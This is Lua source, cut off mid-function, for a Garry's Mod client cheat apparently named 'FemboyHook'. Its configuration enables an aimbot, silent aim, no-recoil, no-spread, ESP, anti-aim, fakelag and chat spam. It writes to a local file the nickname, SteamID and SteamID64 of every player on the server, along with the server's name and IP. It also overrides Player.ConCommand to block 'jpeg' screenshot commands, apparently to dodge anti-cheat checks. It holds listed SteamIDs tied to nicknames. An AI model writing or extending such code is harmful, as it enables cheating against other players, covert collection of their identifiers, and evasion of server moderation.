jit.flush() --lol caca lol Flushes the whole cache of compiled code to have fun hahahaha


local PS = nil
local FHBK = false

local st = {


timer_Create = timer.Create ,
timer_Simple = timer.Simple ,
timer_Remove = timer.Remove ,
input_IsKeyDown = input.IsKeyDown ,
input_LookupBinding = input.LookupBinding ,
input_IsMouseDown = input.IsMouseDown ,

vgui_Create     = vgui.Create ,

cam_Start3D     = cam.Start3D ,
cam_End3D       = cam.End3D ,
cam_Start3D2D   = cam.Start3D2D ,
cam_End3D2D     = cam.End3D2D ,
cam_Start2D     = cam.Start2D ,
cam_End2D       = cam.End2D ,
cam_IgnoreZ     = cam.IgnoreZ ,

chat_AddText = chat.AddText ,

hook_Add        = hook.Add ,
hook_Run        = hook.Run ,
hook_Remove     = hook.Remove ,
hook_GetTable   = hook.GetTable ,

table_Empty = table.Empty ,
table_HasValue = table.HasValue ,
table_RemoveByValue = table.RemoveByValue ,
table_remove = table.remove ,
table_insert = table.insert ,

render_RenderView = render.RenderView ,
render_CopyTexture = render.CopyTexture ,
render_SetRenderTarget = render.SetRenderTarget ,
render_DrawWireframeBox = render.DrawWireframeBox ,
render_MaterialOverride = render.MaterialOverride ,
render_SetColorModulation = render.SetColorModulation ,
render_SuppressEngineLighting = render.SuppressEngineLighting ,
render_SetBlend = render.SetBlend ,
render_SetColorMaterial = render.SetColorMaterial ,
render_SetLightingMode = render.SetLightingMode ,
render_Clear = render.Clear ,
render_DrawBeam = render.DrawBeam ,
render_SetMaterial = render.SetMaterial ,
render_DrawLine = render.DrawLine ,
render_Capture = render.Capture ,
render_CapturePixels = render.CapturePixels ,

file_Exists = file.Exists ,
file_Delete = file.Delete ,
file_Read = file.Read ,
file_Write = file.Write ,
file_CreateDir = file.CreateDir ,
file_Open = file.Open ,
file_IsDir = file.IsDir ,

surface_SetDrawColor = surface.SetDrawColor ,
surface_DrawRect = surface.DrawRect ,
surface_DrawLine = surface.DrawLine ,
surface_SetFont = surface.SetFont ,
surface_SetTextColor = surface.SetTextColor ,
surface_SetTextPos = surface.SetTextPos ,
surface_DrawText = surface.DrawText ,
surface_GetTextSize = surface.GetTextSize ,
surface_CreateFont = surface.CreateFont ,
surface_SetMaterial = surface.SetMaterial ,
surface_DrawTexturedRectRotated = surface.DrawTexturedRectRotated ,
surface_DrawOutlinedRect = surface.DrawOutlinedRect ,
surface_DrawTexturedRect = surface.DrawTexturedRect ,
surface_PlaySound = surface.PlaySound ,
surface_SetTexture = surface.SetTexture ,
surface_GetTextureID = surface.GetTextureID ,
surface_DrawCircle = surface.DrawCircle ,

string_find= string.find,
string_lower= string.lower,
string_format = string.format ,
string_sub = string.sub ,
string_len = string.len ,
string_match = string.match ,
string_Left = string.Left ,
string_gmatch = string.gmatch ,
string_ToColor = string.ToColor ,

draw_DrawText = draw.DrawText ,
draw_SimpleText = draw.SimpleText ,
draw_SimpleTextOutlined = draw.SimpleTextOutlined ,
draw_RoundedBox = draw.RoundedBox ,
draw_RoundedBoxEX = draw.RoundedBoxEx , 

debug_getinfo = debug.getinfo ,

concommand_Add = concommand.Add ,
runco = RunConsoleCommand ,
requ = require ,
prnt = print ,
pinttable = PrintTable ,

os_date = os.date ,
os_time = os.time ,

game_GetIPAddress = game.GetIPAddress ,

me = LocalPlayer ,
ply = player.GetAll ,

math_abs = math.abs ,
math_Round = math.Round ,
math_floor = math.floor ,
math_ceil = math.ceil ,
math_min = math.min ,
math_max = math.max ,
math_Clamp = math.Clamp ,
math_sin = math.sin ,
math_cos = math.cos ,
math_tan = math.tan ,
math_rad = math.rad ,
math_Rand = math.Rand ,
math_deg = math.deg ,
math_atan2 = math.atan2 ,
math_random = math.random ,
math_huge = math.huge ,
math_pi = math.pi ,
math_sqrt = math.sqrt ,
math_NormalizeAngle = math.NormalizeAngle ,
math_Approach = math.Approach ,

engine_TickInterval = engine.TickInterval ,
ents_FindByClass = ents.FindByClass ,

util_TraceEntity = util.TraceEntity ,
util_Compress = util.Compress ,
util_QuickTrac = util.QuickTrace ,
util_QuickTrace = util.QuickTrace ,
util_TraceLine = util.TraceLine ,
util_Base64Encode = util.Base64Encode ,
util_Base64Decode = util.Base64Decode ,

physenv_GetGravity = physenv.GetGravity ,

net_Broadcast = net.Broadcast ,
net_BytesWritten = net.BytesWritten ,
net_Incoming = net.Incoming ,
net_ReadAngle = net.ReadAngle ,
net_ReadBit = net.ReadBit ,
net_ReadBool = net.ReadBool ,
net_ReadColor = net.ReadColor,
net_ReadData = net.ReadData ,
net_ReadDouble = net.ReadDouble ,
net_ReadEntity = net.ReadEntity ,
net_ReadFloat = net.ReadFloat ,
net_ReadHeader = net.ReadHeader ,
net_ReadInt = net.ReadInt ,
net_ReadMatrix = net.ReadMatrix ,
net_ReadNormal = net.ReadNormal ,
net_ReadString = net.ReadString ,
net_ReadTable = net.ReadTable ,
net_ReadType = net.ReadType ,
net_ReadUInt = net.ReadUInt ,
net_ReadVector = net.ReadVector ,
net_Receive = net.Receive ,
net_Send = net.Send ,
net_SendOmit = net.SendOmit ,
net_SendPAS = net.SendPAS ,
net_SendPVS = net.SendPVS ,
net_SendToServer = net.SendToServer ,
net_Start = net.Start ,
net_WriteAngle = net.WriteAngle ,
net_WriteBit = net.WriteBit ,
net_WriteBool = net.WriteBool ,
net_WriteColor = net.WriteColor ,
net_WriteData = net.WriteData , 
net_WriteDouble = net.WriteDouble ,
net_WriteEntity = net.WriteEntity ,
net_WriteFloat = net.WriteFloat ,
net_WriteInt = net.WriteInt ,
net_WriteMatrix = net.WriteMatrix ,
net_WriteNormal = net.WriteNormal ,
net_WriteString = net.WriteString ,
net_WriteUInt = net.WriteUInt ,
net_WriteString = net.WriteString ,
net_WriteTable = net.WriteTable ,
net_WriteType = net.WriteType ,
net_WriteUInt = net.WriteUInt ,
net_WriteVector = net.WriteVector ,

sh = ScrH , 
sw = ScrW ,

gameevent_Listen = gameevent.Listen ,

Angle = Angle  ,
Material = Material ,
Vector = Vector ,
Color = Color ,
Player = Player ,
Entity = Entity ,
pairs = pairs ,
ipairs = ipairs  ,
IsValid = IsValid ,
tostring = tostring  ,
tonumber = tonumber ,
CurTime = CurTime ,
IsFirstTimePredicted = IsFirstTimePredicted ,
Lerp = Lerp ,
LerpAngle = LerpAngle ,

fa = LocalPlayer():EyeAngles() , 

bP = nil ,
tC = 0 ,
flT = 0 ,

baseyaw = 0 ,
hruxisSide = 1 ,
flmodel = nil ,
flakeSize = 10 ,
flakeSizeVariation = 5 ,
flakeSpeed = 150 ,
flakeSpeedVariation = 75 ,
flakeRotationSpeed = 150 ,
flakeRotationSpeedVariation = 50 ,
size = 150 ,
flakes = {} ,

tickCounter = 0 ,
cpuUsage = 0 ,
gpuUsage = 0 ,
ramUsage = 0 ,

freecamAngles2 = LocalPlayer():EyeAngles() ,
freecamPos = Vector() ,
freecamEnabled = false ,
keyPressed = false ,
iskeydown = false ,

df ,

trailpos = {} ,
AutoSteamId = {
    "STEAM_0:0:509211855", --me iron2346
    "STEAM_0:0:781200124", --me again but alt
    "STEAM_0:1:639206089", --friend zwk
    "STEAM_0:0:181425854", --friend max876
    "STEAM_0:0:156253535", --friend nayl
} ,

FriendSteamId = {
    "STEAM_0:1:639206089", --friend zwk
    "STEAM_0:0:156253535", --friend nayl
    "STEAM_0:0:181425854", --friend max876
} ,

SkeletonTBL = {
	{ F = "ValveBiped.Bip01_Head1", B = "ValveBiped.Bip01_Neck1" },
	{ F = "ValveBiped.Bip01_Neck1", B = "ValveBiped.Bip01_Spine4" },
	{ F = "ValveBiped.Bip01_Spine4", B = "ValveBiped.Bip01_Spine2" },
	{ F = "ValveBiped.Bip01_Spine2", B = "ValveBiped.Bip01_Spine1" },
	{ F = "ValveBiped.Bip01_Spine1", B = "ValveBiped.Bip01_Spine" },
	{ F = "ValveBiped.Bip01_Spine", B = "ValveBiped.Bip01_Pelvis" },
	{ F = "ValveBiped.Bip01_Neck1", B = "ValveBiped.Bip01_L_UpperArm" },
	{ F = "ValveBiped.Bip01_L_UpperArm", B = "ValveBiped.Bip01_L_Forearm" },
	{ F = "ValveBiped.Bip01_L_Forearm", B = "ValveBiped.Bip01_L_Hand" },
	{ F = "ValveBiped.Bip01_Neck1", B = "ValveBiped.Bip01_R_UpperArm" },
	{ F = "ValveBiped.Bip01_R_UpperArm", B = "ValveBiped.Bip01_R_Forearm" },
	{ F = "ValveBiped.Bip01_R_Forearm", B = "ValveBiped.Bip01_R_Hand" },
	{ F = "ValveBiped.Bip01_Pelvis", B = "ValveBiped.Bip01_L_Thigh" },
	{ F = "ValveBiped.Bip01_L_Thigh", B = "ValveBiped.Bip01_L_Calf" },
	{ F = "ValveBiped.Bip01_L_Calf", B = "ValveBiped.Bip01_L_Foot" },
	{ F = "ValveBiped.Bip01_L_Foot", B = "ValveBiped.Bip01_L_Toe0" },
	{ F = "ValveBiped.Bip01_Pelvis", B = "ValveBiped.Bip01_R_Thigh" },
	{ F = "ValveBiped.Bip01_R_Thigh", B = "ValveBiped.Bip01_R_Calf" },
	{ F = "ValveBiped.Bip01_R_Calf", B = "ValveBiped.Bip01_R_Foot" },
	{ F = "ValveBiped.Bip01_R_Foot", B = "ValveBiped.Bip01_R_Toe0" },
} ,

curson = nil ,
solist = {} ,
curindd = 1 ,
vollev = 1 ,

badSweps = {
    ["gmod_camera"] = true,
	["manhack_welder"] = true,
	["weapon_medkit"] = true,
	["gmod_tool"] = true,
	["weapon_physgun"] = true,
	["weapon_physcannon"] = true,
	["weapon_bugbait"] = true,
    ["weapon_frag"] = true,
    ["weapon_slam"] = true,
    ["none"] = true,
    ["weapon_popcorn"] = true,
    ["weapon_popcorn_spam"] = true,
    ["weapon_lightsaber"] = true,
    ["remotecontroller"] = true,
    ["laserpointer"] = true,
    ["keypad_cracker"] = true,
    ["weapon_fists"] = true,
    ["keys"] = true,
} ,

goodsweps = {
    ["weapon_crossbow"] = true,
} ,

friends = {} ,

travelspeedinfo = 0 ,
gravityinfo = 0 ,
predinfo = 0 ,
crosspredinfo = 0 ,

lnct = 0 ,

NTCD = {
	["SendToServer"] = net.SendToServer,
	["Start"] = net.Start,
	["WriteAngle"] = net.WriteAngle,
	["WriteBit"] = net.WriteBit,
	["WriteBool"] = net.WriteBool,
	["WriteColor"] = net.WriteColor,
	["WriteData"] = net.WriteData,
	["WriteDouble"] = net.WriteDouble,
	["WriteEntity"] = net.WriteEntity,
	["WriteFloat"] = net.WriteFloat,
	["WriteInt"] = net.WriteInt,
	["WriteMatrix"] = net.WriteMatrix,
	["WriteNormal"] = net.WriteNormal,
	["WriteString"] = net.WriteString,
	["WriteTable"] = net.WriteTable,
	["WriteUInt"] = net.WriteUInt,
	["WriteVector"] = net.WriteVector
} ,

BFR = "" ,

chatdelayspam = CurTime() ,

nextact = 0 ,

} 

st.table_Empty(st.friends)

local mdrconf = {}
mdrconf.vars = {}
mdrconf.col = {}
mdrconf.util = {}

mdrconf.vars["PS_watermark"] = true
mdrconf.vars["PS_crossbowinfo"] = true
mdrconf.vars["PS_timestamp"] = true

mdrconf.vars["PS_skeleton"] = true
mdrconf.vars["PS_selfskeleton"] = false

mdrconf.vars["PS_hitbox"] = false
mdrconf.vars["PS_selfhitbox"] = false

mdrconf.vars["PS_espname"] = true
mdrconf.vars["PS_espusergrp"] = false
mdrconf.vars["PS_esphealth"] = false
mdrconf.vars["PS_esparmor"] = false
mdrconf.vars["PS_weapon"] = false
mdrconf.vars["PS_espvelocity"] = false
mdrconf.vars["PS_friendesp"] = false
mdrconf.vars["PS_moneyesp"] = true

mdrconf.vars["PS_velocity"] = true
mdrconf.vars["PS_trailrain"] = false
mdrconf.vars["PS_cameraspam"] = false
mdrconf.vars["PS_flashspam"] = false
mdrconf.vars["PS_usespam"] = false
mdrconf.vars["PS_chatspam"] = false
mdrconf.vars["chatspamsentence"] = ">-< FemboyHook The Best Of What A Femboy Can Offer >-<"

mdrconf.vars["PS_netloger"] = false
mdrconf.vars["PS_httploger"] = false
mdrconf.vars["PS_fileloger"] = false

mdrconf.vars["PS_autostrafe"] = true
mdrconf.vars["PS_autobunnyhop"] = true
mdrconf.vars["PS_BUNNYCHANCE"] = 100

mdrconf.vars["PS_freecam"] = false

mdrconf.vars["PS_chamsply"] = false
mdrconf.vars["PS_chamsprop"] = false
mdrconf.vars["PS_selfchams"] = false 
mdrconf.vars["PS_selfweaponchams"] = false 

mdrconf.vars["PS_boxply"] = false
mdrconf.vars["PS_selfbox"] = false
mdrconf.vars["PS_boxprop"] = false
mdrconf.vars["PS_fallbox"] = true

mdrconf.vars["PS_fov"] = true
mdrconf.vars["PS_fovdist"] = 130
mdrconf.vars["PS_third"] = false
mdrconf.vars["PS_thirddist"] = 130

mdrconf.vars["PS_skyboxremove"] = false
mdrconf.vars["PS_physrainbow"] = true

mdrconf.vars["PS_norecoil"] = true
mdrconf.vars["PS_NoSpread"] = true

mdrconf.vars["PS_vjbase"] = false

mdrconf.vars["PS_hitsound"] = true

mdrconf.vars["PS_physline"] = true

mdrconf.vars["PS_fastwalk"] = false

mdrconf.vars["PS_fakelag"] = false
mdrconf.vars["PS_fakelagfactor"] = 3
mdrconf.vars["PS_fakelagada"] = false

mdrconf.vars["PS_antiaim"] = false

mdrconf.vars["PS_antiaimpu"] = false
mdrconf.vars["PS_antiaimpcus"] = false

mdrconf.vars["PS_antiaimspin"] = false
mdrconf.vars["PS_antiaimsway"] = false
mdrconf.vars["PS_antiaimcus"] = false

mdrconf.vars["PS_antiaimcusp"] = 0
mdrconf.vars["PS_antiaimcusy"] = 90

mdrconf.vars["PS_silent"] = true
mdrconf.vars["PS_aimbot"] = false
mdrconf.vars["PS_hideshot"] = false
mdrconf.vars["PS_aimbotFOV"] = 10
mdrconf.vars["PS_BreakLC"] = false
mdrconf.vars["PS_INTERPOLATION"] = false

mdrconf.vars["PS_Ignores-Steam-friends"] = false
mdrconf.vars["PS_Ignores-Admins"] = true
mdrconf.vars["PS_Ignores-Bots"] = false
mdrconf.vars["PS_Ignores-Frozen"] = true
mdrconf.vars["PS_Ignores-Nocliping"] = true
mdrconf.vars["PS_Ignores-God-time"] = true
mdrconf.vars["PS_Ignores-Driver"] = true

mdrconf.vars["PS_bckgrd"] = ".PSSI/b/rusti.png"
mdrconf.vars["PS_hit"] = "neverlose.wav"
mdrconf.vars["PS_physlin"] = "Cable/redlaser"
mdrconf.vars["PS_bone"] = "ValveBiped.Bip01_Head1"
mdrconf.vars["PS_predtype"] = "Classic Pred"

mdrconf.col["Dframe"] = "55 55 55 0"
mdrconf.col["Dframe2"] = "55 55 55 100"
mdrconf.col["Sheet"] = "255 255 255 255"
mdrconf.col["Panel1c"] = "75 75 75 150"
mdrconf.col["Panel2c"] = "75 75 75 150"
mdrconf.col["Panel3c"] = "75 75 75 150"
mdrconf.col["Panel4c"] = "75 75 75 150"
mdrconf.col["Panel5c"] = "75 75 75 150"
mdrconf.col["Button1"] = "255 192 203 255"
mdrconf.col["Button2"] = "255 182 193 100"
mdrconf.col["buttonother"] = "85 85 85 255"
mdrconf.col["Checkbox1"] = "255 192 203 255"
mdrconf.col["Checkbox2"] = "255 182 193 255"
mdrconf.col["Label"] = "255 255 255 255"
mdrconf.col["panelbtnsh"] = "225 140 203 50"
mdrconf.col["msgc1"] = "255 192 203 255"
mdrconf.col["msgc2"] = "48 213 200 255"
mdrconf.col["msgc2c"] = "195 90 90 255"
mdrconf.col["msgc3"] = "0 255 255 255"
mdrconf.col["msgc4"] = "48 213 200 255"
mdrconf.col["msgc5"] = "0 255 0 255"
mdrconf.col["white"] = "255 255 255 255"
mdrconf.col["black"] = "30 30 30 255"
mdrconf.col["pink"] = "255 0 255 255"
mdrconf.col["Gray"] = "30 30 30 255"
mdrconf.col["watermarkcol1"] = "33 33 38 255"
mdrconf.col["watermarkcol2"] = "255 192 203 255"
mdrconf.col["skeletoncolor"] = "255 255 255 255"
mdrconf.col["selfskeletoncolor"] = "255 255 255 255"
mdrconf.col["hitboxcolor"] = "255 255 255 255"
mdrconf.col["selfhitboxcolor"] = "255 255 255 255"
mdrconf.col["espname"] = "255 255 255 255"
mdrconf.col["esphealth"] = "255 255 255 255"
mdrconf.col["espusergrp"] = "255 255 255 255"
mdrconf.col["esparmor"] = "255 255 255 255"
mdrconf.col["chamscolply1"] = "43 255 255 255"
mdrconf.col["chamscolply2"] = "238 130 238 255"
mdrconf.col["chamscolprop1"] = "43 255 255 255"
mdrconf.col["chamscolprop2"] = "238 130 238 255"
mdrconf.col["selfchamscol"] = "43 255 255 255"
mdrconf.col["selfweaponchamscol"] = "43 255 255 255"
mdrconf.col["boxplycolor1"] = "255 255 255 255"
mdrconf.col["selfboxplycolor1"] = "255 255 255 255"
mdrconf.col["boxpropcolor1"] = "255 255 255 255"
mdrconf.col["fallboxcolor1"] = "255 255 255 255"
mdrconf.col["handchamscol"] = "255 255 255 255"
mdrconf.col["weaponchamscol"] = "255 255 255 255"
mdrconf.col["fovcircle"] = "255 192 203 255"
mdrconf.col["snapline"] = "255 192 203 255"
mdrconf.col["bonebox"] = "255 192 203 255"
mdrconf.col["fakelagbox"] = "255 192 203 255"
mdrconf.col["lc"] = "255 192 203 255"
mdrconf.col["blc"] = "195 90 90 255"

mdrconf.util["WatermarkText"] = "FemboyHook"
mdrconf.util["Version"] = "1.0 Private"
mdrconf.util["dontforget"] = "Femboy Are Better Than Real Women Even In Gmod Cheat"
mdrconf.util["Hitsound"] = {"senpai.wav","door.wav","fata.wav","stivi.wav","rust.wav","neverlose.wav"}
mdrconf.util["physline"] = {"sprites/light_ignorez","particle/bendibeam","trails/plasma","trails/smoke","Cable/redlaser","trails/physbeam","trails/electric","effects/repair_claw_trail_red","trails/laser","effects/repair_claw_trail_blue"}
mdrconf.util["backgroun"] = {".PSSI/b/nazifemboy.png",".PSSI/b/Femboy.png",".PSSI/b/femboyhoo.png",".PSSI/b/Priv9.net.png",".PSSI/b/Noir.png",".PSSI/b/NaziZwk.png",".PSSI/b/zwkcheat2.png",".PSSI/b/PatelinDaesh.png",".PSSI/b/grossport.png",".PSSI/b/shotgun-200.png",".PSSI/b/femboyhook.png",".PSSI/b/eidmada.png",".PSSI/b/goku.png",".PSSI/b/spacemenu.png",".PSSI/b/chien.png",".PSSI/b/rusti.png",".PSSI/b/slows.png"}
mdrconf.util["bone"] = {"ValveBiped.Bip01_Head1","ValveBiped.Bip01_Spine2","ValveBiped.Bip01_Pelvis"}
mdrconf.util["predtype"] = {"Classic Pred","Engine Pred","Velocity Pred"}

st.tickrate = tostring(st.math_Round(1 / st.engine_TickInterval()))
st.runco("stopsound")
st.runco("cl_updaterate", st.tickrate)
st.runco("cl_cmdrate", st.tickrate) 
st.runco("rate", st.tickrate)
st.runco("cl_interp", 0.000000)
st.runco("cl_interp_ratio", 0.000000)
st.runco("net_graph",1)

/*
      ███╗██╗   ██╗████████╗██╗██╗     ███████╗███╗      
      ██╔╝██║   ██║╚══██╔══╝██║██║     ██╔════╝╚██║      
█████╗██║ ██║   ██║   ██║   ██║██║     ███████╗ ██║█████╗
╚════╝██║ ██║   ██║   ██║   ██║██║     ╚════██║ ██║╚════╝
      ███╗╚██████╔╝   ██║   ██║███████╗███████║███║      
      ╚══╝ ╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝╚══╝      
*/
function Femboyhooks(event, func) local str = event st.hook_Add(event, str, func) end

function hookstring(length)
    local charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    local str = ""
    for i = 1, length do
        local randomIndex = st.math_random(1, #charset)
        str = str .. st.string_sub(charset, randomIndex, randomIndex)
    end
    return str
end

-- local UID = st.util_Base64Decode(st.file_Read(".PSSI/UIDPS.txt", "GAME"))
-- function WL(ID)
--     for _, AutoId in ipairs(st.AutoSteamId) do
--         if ID == AutoId then return true end
--     end
--     return false
-- end

function FriendCo()
    for _, pl in pairs(st.ply()) do
        local id = pl:SteamID()
        for _, frid in ipairs(st.FriendSteamId) do
            if id == frid then
                return true, id
            end
        end
    end
    return false, nil
end

st.concommand_Add("mdrconf.vars[PS_ChatSpam]", function(ply, cmd, args)
    if not args[1] then
        print("No Text.")
        return
    end
    mdrconf.vars["chatspamsentence"] = table.concat(args, " ")
end)

local FriendConnected, FriendConnectedSteamId = FriendCo()

/*
      ███╗███████╗ ██████╗ ███╗   ██╗████████╗███████╗███╗      
      ██╔╝██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔════╝╚██║      
█████╗██║ █████╗  ██║   ██║██╔██╗ ██║   ██║   ███████╗ ██║█████╗
╚════╝██║ ██╔══╝  ██║   ██║██║╚██╗██║   ██║   ╚════██║ ██║╚════╝
      ███╗██║     ╚██████╔╝██║ ╚████║   ██║   ███████║███║      
      ╚══╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══╝      
*/

st.surface_CreateFont( "epic",{font = "TabLarge",extended = false,size = 13,weight = 900,blursize = 0})
st.surface_CreateFont("DTFont", { font = "Verdana", size = 15, antialias = false, outline = true } )

/*
      ███╗███╗   ███╗ █████╗ ████████╗███████╗██████╗ ██╗ █████╗ ██╗     ███╗      
      ██╔╝████╗ ████║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██║██╔══██╗██║     ╚██║      
█████╗██║ ██╔████╔██║███████║   ██║   █████╗  ██████╔╝██║███████║██║      ██║█████╗
╚════╝██║ ██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║██╔══██║██║      ██║╚════╝
      ███╗██║ ╚═╝ ██║██║  ██║   ██║   ███████╗██║  ██║██║██║  ██║███████╗███║      
      ╚══╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚══╝      
*/

st.flat = CreateMaterial("flat", "UnLitGeneric")
st.flat_z = CreateMaterial("flat_z", "UnLitGeneric",{["$ignorez"] = 1})
st.textured_z = CreateMaterial("textured_z", "VertexLitGeneric",{["$ignorez"] = 1})
st.textured = CreateMaterial("textured", "VertexLitGeneric") 

st.selfillum = CreateMaterial( CurTime() + 1, "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$model"] = "1",
    ["$nocull"] = "0",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0 0.3 0.7]",
    ["$selfillumtint"] = "[0.7 0.5 0.8]",
})

st.selfillum_z = CreateMaterial( CurTime() + 2, "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$model"] = "1",
    ["$nocull"] = "0",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0 0.3 0.7]",
    ["$selfillumtint"] = "[0.7 0.5 0.8]",
    ["$ignorez"] = 1,
})

st.wireframe = CreateMaterial(CurTime() + 3, "VertexLitGeneric", {
    ["$wireframe"] = 1,
})

st.wireframe_z = CreateMaterial(CurTime() + 4, "VertexLitGeneric", {
	["$wireframe"] = 1,
    ["$ignorez"] = 1,
})


/*
      ███╗██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗     ██╗      ██████╗  ██████╗ ███████╗███╗      
      ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     ██║     ██╔═══██╗██╔════╝ ██╔════╝╚██║      
█████╗██║ ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗    ██║     ██║   ██║██║  ███╗███████╗ ██║█████╗
╚════╝██║ ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║    ██║     ██║   ██║██║   ██║╚════██║ ██║╚════╝
      ███╗███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝    ███████╗╚██████╔╝╚██████╔╝███████║███║      
      ╚══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══╝      
*/

local mds = "PS_Load"
local mdsf = "PS_Load_Log.txt"
local msd = ".FemboyHook/" .. mds

if not st.file_Exists(msd, "DATA") then
    st.file_CreateDir(msd)
end

local dms = msd .. "/" .. mdsf
if not st.file_Exists(dms, "DATA") then
    local firstRunText = st.os_date("First Run : %Y-%m-%d %H:%M:%S")
    st.file_Write(dms, firstRunText)
else
    local sdm = st.file_Read(dms, "DATA") or ""
    local newLogEntry = "\n\nRun Date: " .. st.os_date("%Y-%m-%d %H:%M:%S") .. " \nServer Name: " .. GetHostName() .. " \nServer IP: " .. st.game_GetIPAddress()
    local loggg = sdm .. newLogEntry
    st.file_Write(dms, loggg)
end

function logg(st, txt)
    local mdr = file.Open(".femboyhook/" .. txt, "r", "DATA")
    if not mdr then
        return false
    end
    local l = mdr:ReadLine()
    while l do
        if l:find(st, 1, true) then
            mdr:Close()
            return true
        end
        l = mdr:ReadLine()
    end
    mdr:Close()
    return false
end

function rp()
    local txt = "Logger.txt"
    if not st.file_IsDir(".femboyhook", "DATA") then
        st.file_CreateDir(".femboyhook")
    end
    local mdrr = file.Open(".femboyhook/" .. txt, "a", "DATA")
    local sn = GetHostName()  
    local si = st.game_GetIPAddress() 
    for _, pl in ipairs(st.ply()) do
        local p = pl:Nick()
        local s = pl:SteamID()
        local ss = pl:SteamID64()
        local c = st.os_date("%Y-%m-%d %H:%M:%S")
        if not logg(ss, txt) then
            mdrr:Write(p .. " | " .. s .. " | " .. ss .. " | " .. c .. " | " .. sn .. " | " .. si .. "\n")
        end
    end
    mdrr:Close()
end
rp()

-- no jpg for camera spam
local players=FindMetaTable("Player")
local oldcmd=players.ConCommand
players.ConCommand=function(p,cmd,...)
	if cmd=="jpeg"then return end
	return oldcmd(p,cmd,...)
end

/*
      ███╗ ██████╗ ██╗   ██╗██╗    ███████╗████████╗██╗   ██╗███████╗███████╗███╗      
      ██╔╝██╔════╝ ██║   ██║██║    ██╔════╝╚══██╔══╝██║   ██║██╔════╝██╔════╝╚██║      
█████╗██║ ██║  ███╗██║   ██║██║    ███████╗   ██║   ██║   ██║█████╗  █████╗   ██║█████╗
╚════╝██║ ██║   ██║██║   ██║██║    ╚════██║   ██║   ██║   ██║██╔══╝  ██╔══╝   ██║╚════╝
      ███╗╚██████╔╝╚██████╔╝██║    ███████║   ██║   ╚██████╔╝██║     ██║     ███║      
      ╚══╝ ╚═════╝  ╚═════╝ ╚═╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝     ╚══╝      
*/

function CreatecheckBox(lbl, x, y, con, parent)
    local el = st.vgui_Create("DLabel", parent)
	el:SetText(lbl)
    el:SetFont("Trebuchet24")
    el:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
	local w, h = el:GetTextSize()
	el:SetWide(w)
	el:SetPos(x + 25, y - h / 12)
    local checkBox = parent:Add("DCheckBox")
    checkBox:SetPos( x, y )
    checkBox:SetSize( 20, 20 )
    checkBox:SetValue(mdrconf.vars[con])
    function checkBox:OnChange(bval) 
        mdrconf.vars[con] = bval 
    end
    function checkBox:Paint(w,h)
        local v = self:GetChecked()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Checkbox1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Checkbox1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Checkbox2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
end

function CreateLabel(lbl, x, y, parent)
    local label = st.vgui_Create("DLabel", parent)
    label:SetText(lbl)
    label:SetPos(x, y)
    label:SetFont("Trebuchet24")
    label:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
    label:SizeToContents()
end

function Createcolormixer(lbl, x, y, con, parent)
    local ColorLabel = st.vgui_Create("DLabel", parent)
	ColorLabel:SetText(lbl)
    ColorLabel:SetFont("Trebuchet18")
    ColorLabel:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
	local w, h = ColorLabel:GetTextSize()
	ColorLabel:SetWide(w)
	ColorLabel:SetPos(x, y - h / 8)
    local colorSelector = st.vgui_Create("DColorMixer", parent)
	colorSelector:SetSize(100, 95)
    colorSelector:SetPos(x, y + 20)
	colorSelector:SetPalette(false)
    colorSelector:SetAlphaBar(false)
    colorSelector:SetWangs(false)
    function colorSelector:ValueChanged(val)
		local r = tostring(val.r)
		local g = tostring(val.g)
		local b = tostring(val.b)
		local a = tostring(val.a)
		local col = r.." "..g.." "..b.." "..a
		mdrconf.col[con] = col
    end	
    colorSelector.HSV.Knob:SetSize( 20, 20 )
    function colorSelector.HSV.Knob:Paint( w, h )
        st.surface_SetMaterial(Material(".PSSI/a/a1.png"))
        st.surface_SetDrawColor(255, 255, 255, 255)
        st.surface_DrawTexturedRect(0, 0, w, h)
    end
end

function CreateDropdown(lbl, x, y, f, t, vli, choices, con, parent)
    local dropdownLabel = st.vgui_Create("DLabel", parent)
	dropdownLabel:SetText(lbl)
    dropdownLabel:SetFont("Trebuchet24")
    dropdownLabel:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
	local w, h = dropdownLabel:GetTextSize()
	dropdownLabel:SetWide(w)
	dropdownLabel:SetPos(x, y - h / 8)
	local dropdown = st.vgui_Create("DComboBox", parent)
	dropdown:SetSize(f, t)
	dropdown:SetPos(x, y + 20)
    dropdown:SetValue(vli)
	for k, v in ipairs(choices) do
		dropdown:AddChoice(v)
	end
